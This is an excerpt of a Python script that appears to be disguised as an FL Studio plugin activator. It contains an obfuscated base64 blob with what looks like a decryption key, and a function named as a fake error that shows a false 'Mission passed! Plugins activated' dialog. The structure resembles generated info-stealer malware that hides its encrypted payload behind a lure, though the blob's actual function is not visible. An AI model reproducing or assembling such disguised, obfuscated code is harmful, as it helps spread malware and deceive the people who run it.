...
uF7SyRENlwVS15h8pvCEbK96HHzwY1GPhafasFdsB1SBcql2VFHD3YNzmCD/1G3IomyRq9LxPxxKaW9pnyBElpJKVVgla5wZ0PmD8Y9JjEwUotiqYg0jVHYfQtbim1euyP8buSEvSpxr/FZyFQD2eAK3iwdbAYGK6J6mo3M+5StD8uWbrrzrCyulWEmnjL88TY1Zgdu75sztykIBfJ/GIg==
"""

v4r_k3y            = "ShCPCQRPeQlEaPNSzhIwQHBQclfUKPIIMSXfHHWUPTemOMJHAqCuToLnhRZNuqheqVLXxWWKnkCwiXOAOdGRiyZcpUFLhVtGxdszBFwkTsbYPPVbfaVKhkCqytzbWGZkuBcmrqKRByzFPUmiZoGFCaGAStNStkozWMGRDCDEyvP"
v4r_website        = "None"
...
def D3f_F4k33rr0r():
    ...
    root = tk.Tk()
    root.withdraw()
    messagebox.showerror("Mission passed! [FL Studio Plugins activated!]", "The Plugins should be activated after a restart now. If it doesn't work, the tool is outdated. Then we're sorry.")
